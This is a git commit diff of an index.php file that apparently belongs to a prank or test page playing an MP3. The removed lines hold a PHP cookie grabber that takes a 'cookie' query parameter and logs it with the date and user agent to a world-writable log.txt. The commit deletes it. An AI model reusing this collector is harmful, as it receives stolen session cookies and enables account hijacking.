155f99d9defae25391b267e364c7049df23c43b0
TestName{UFO} <36362763+testufo@users.noreply.github.com>
2020-10-20 20:45:01 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,11 +1,3 @@
-<?php
-echo '<script>  var audio = new Audio('/Roy Orbison - 01 - Oh Pretty Woman.mp3')\;
-  audio.play()\;
-</script>';
-$collectedCookie=$_GET["cookie"];
-$date=date("l ds of F Y h:i:s A");
-$user_agent=$_SERVER['HTTP_USER_AGENT'];
-$file=fopen('log.txt','a'); // chmod 777 log.txt
-fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$collectedCookie \n");
-fclose($file);
-?>
+<script>  var audio = new Audio('/Roy Orbison - 01 - Oh Pretty Woman.mp3');
+  audio.play();
+</script>
